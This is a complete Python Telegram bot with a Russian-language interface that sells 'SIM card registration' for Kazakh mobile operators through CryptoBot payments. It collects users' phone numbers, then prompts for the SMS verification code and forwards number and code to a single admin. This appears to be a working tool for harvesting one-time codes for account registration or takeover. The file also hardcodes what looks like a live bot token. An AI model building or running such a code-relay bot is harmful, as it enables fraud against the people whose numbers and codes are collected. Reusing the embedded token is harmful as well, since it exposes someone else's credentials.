import asyncio
import json
import logging
import os
import tempfile
import re
from pathlib import Path
from typing import Dict, List, Any

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
TOKEN = "8623489996:AAE5rfYaS4JbAGrso_veeFALIsLagXx74s8"
ADMIN_ID = 8209617821
PRICE_USD = 2.5
PRICE_TEXT = f"Стоимость регистрации одной SIM-карты: **{PRICE_USD}$**"
CRYPTOBOT_INVOICE_LINK = "https://t.me/CryptoBot?start=pay_ССЫЛКА_ТУТ"

DATA_FILE = Path("bot_data.json")
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)

# Глобальные данные
pending_requests: List[Dict[str, Any]] = []
users: set[int] = set()
request_counter: int = 0
data_lock = asyncio.Lock()

# ================= СОСТОЯНИЯ =================
class RegForm(StatesGroup):
    operator = State()
    phone = State()

class AdminForm(StatesGroup):
    broadcast = State()

# ================= JSON ФУНКЦИИ =================
async def load_data():
    global pending_requests, users, request_counter
    if not DATA_FILE.exists():
        await save_data()
        return
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        pending_requests = data.get("pending_requests", [])
        users = set(data.get("users", []))
        request_counter = data.get("request_counter", 0)
    except Exception as e:
        logging.error(f"Ошибка загрузки: {e}")

async def save_data():
    async with data_lock:
        temp_path = Path(tempfile.NamedTemporaryFile(delete=False).name)
        try:
            data = {"pending_requests": pending_requests, "users": list(users), "request_counter": request_counter}
            with open(temp_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            temp_path.replace(DATA_FILE)
        except Exception as e:
            logging.error(f"Ошибка сохранения: {e}")

# ================= КЛАВИАТУРЫ =================
def get_main_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📞 Зарегистрировать SIM")],
            [KeyboardButton(text="💰 Цена и оплата"), KeyboardButton(text="🆘 Поддержка")]
        ],
        resize_keyboard=True
    )

def get_operators_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Activ"), KeyboardButton(text="Tele2"), KeyboardButton(text="Altel")],
            [KeyboardButton(text="← Назад")]
        ],
        resize_keyboard=True
    )

# ================= ХЕНДЛЕРЫ ПОЛЬЗОВАТЕЛЯ =================
@router.message(CommandStart())
async def cmd_start(message: Message):
    users.add(message.chat.id)
    await save_data()
    await message.answer(f"⚠️ Добро пожаловать.\n{PRICE_TEXT}\n\nВыбери действие:", reply_markup=get_main_kb(), parse_mode="Markdown")

@router.message(F.text == "💰 Цена и оплата")
async def show_price(message: Message):
    await message.answer(f"{PRICE_TEXT}\n\nОплата через CryptoBot.\nИнвойс будет выдан после проверки номера.", parse_mode="Markdown")

@router.message(F.text == "🆘 Поддержка")
async def support_handler(message: Message):
    await bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    await message.answer("Запрос отправлен.")

@router.message(F.text == "📞 Зарегистрировать SIM")
async def start_reg(message: Message, state: FSMContext):
    await message.answer("Выбери оператора:", reply_markup=get_operators_kb())
    await state.set_state(RegForm.operator)

@router.message(RegForm.operator, F.text.in_({"Activ", "Tele2", "Altel"}))
async def choose_operator(message: Message, state: FSMContext):
    await state.update_data(operator=message.text)
    await message.answer(f"Выбран: {message.text}\nВведи номер (пример: 77071234567):")
    await state.set_state(RegForm.phone)

@router.message(RegForm.phone)
async def process_phone(message: Message, state: FSMContext):
    global request_counter
    raw_phone = re.sub(r"\D", "", message.text)
    if not (10 <= len(raw_phone) <= 12):
        return await message.answer("❌ Неверный номер. Введи заново:")

    data = await state.get_data()
    request_counter += 1
    rid = request_counter

    pending_requests.append({
        "id": rid, "user_id": message.chat.id, "username": message.from_user.username,
        "operator": data['operator'], "phone": raw_phone, "status": "pending", "dialog_active": True
    })

    await message.answer(f"Заявка #{rid} отправлена. Ожидайте решения.", reply_markup=get_main_kb())

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Зарегистрировать", callback_data=f"reg_{rid}"),
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"rej_{rid}")
    ]])
    await bot.send_message(ADMIN_ID, f"🆕 ЗАЯВКА #{rid}\n👤 @{message.from_user.username}\n📶 {data['operator']}\n📱 {raw_phone}", reply_markup=kb)
    await state.clear()
    await save_data()

# ================= АДМИН ПАНЕЛЬ & CALLBACKS =================
@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.chat.id != ADMIN_ID: return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Все заявки", callback_data="list_all")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="broadcast")]
    ])
    await message.answer("🛠 АДМИН ПАНЕЛЬ", reply_markup=kb)

@router.callback_query(F.data.startswith("reg_"))
async def start_reg_process(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    for req in pending_requests:
        if req["id"] == rid:
            req["status"] = "waiting_sms_code"
            await bot.send_message(req["user_id"], "✅ Админ начал регистрацию.\nВведите **код из SMS**:")
            await callback.message.edit_text(f"Заявка #{rid}: Ожидаем СМС от клиента...")
            await save_data()
            break
    await callback.answer()

@router.callback_query(F.data.startswith("finish_"))
async def finish_reg(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    for req in pending_requests:
        if req["id"] == rid:
            req["status"] = "registered"
            await bot.send_message(req["user_id"], f"🎉 Готово! #{rid} зарегистрирован.\nОплата: {CRYPTOBOT_INVOICE_LINK}")
            await callback.message.edit_text(f"✅ Заявка #{rid} завершена.")
            await save_data()
            break
    await callback.answer()

@router.callback_query(F.data.startswith("rej_"))
async def reject_reg(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    for req in pending_requests:
        if req["id"] == rid:
            req["status"] = "rejected"
            await bot.send_message(req["user_id"], "❌ Заявка отклонена.")
            await callback.message.edit_text(f"❌ Заявка #{rid} отклонена.")
            await save_data()
            break
    await callback.answer()

# ================= ЛОГИКА ДИАЛОГА (СМС КНОПКИ) =================
@router.message()
async def catch_messages(message: Message):
    if message.chat.id == ADMIN_ID: return

    active_req = next((r for r in pending_requests if r["user_id"] == message.chat.id and r["status"] == "waiting_sms_code"), None)
    
    if active_req:
        code = message.text.strip()
        if code.isdigit():
            active_req["status"] = "sms_received"
            await message.reply("⏳ Код передан админу...")
            
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🏁 Завершить", callback_data=f"finish_{active_req['id']}")],
                [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"rej_{active_req['id']}")]
            ])
            await bot.send_message(ADMIN_ID, f"📩 КОД СМС: `{code}`\nЗаявка #{active_req['id']}\nНомер: {active_req['phone']}", reply_markup=kb, parse_mode="Markdown")
            await save_data()
        else:
            await message.answer("Введите только цифры кода!")
    else:
        await bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)

async def main():
    await load_data()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
